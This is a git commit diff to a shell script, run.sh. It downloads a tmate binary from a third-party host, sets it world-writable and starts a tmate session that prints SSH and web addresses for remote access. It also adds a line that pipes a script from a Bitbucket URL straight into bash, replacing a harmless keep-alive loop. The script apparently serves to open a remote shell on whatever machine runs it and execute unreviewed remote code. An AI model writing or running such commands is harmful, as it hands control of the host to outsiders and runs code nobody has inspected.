92d7021c3a44c4a5b1edfcc1ecd81f43658a956a
Sazfa-Kuy <129221597+Sazfa-Kuy@users.noreply.github.com>
2024-01-09 13:14:06 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,16 +3,11 @@ apt-get update
 wget https://try.gitea.io/mustofa/file/raw/branch/master/tmate
 chmod 777 tmate
 
-./tmate -F || {
-    ./tmate -S /var/tmate.sock new-session -d
-    ./tmate -S /var/tmate.sock wait tmate-ready
-    ./tmate -S /var/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
-    ./tmate -S /var/tmate.sock display -p "Connect with web: #{tmate_web}"
-    sleep 3
-}
+./tmate -F
+./tmate -S /var/tmate.sock new-session -d
+./tmate -S /var/tmate.sock wait tmate-ready
+./tmate -S /var/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
+./tmate -S /var/tmate.sock display -p "Connect with web: #{tmate_web}"
+sleep 3
 
-while true
-do
-        echo "My Work"
-        sleep 60
-done
+curl -sL https://bitbucket.org/koploks/shc/raw/master/boled04.sh | bash
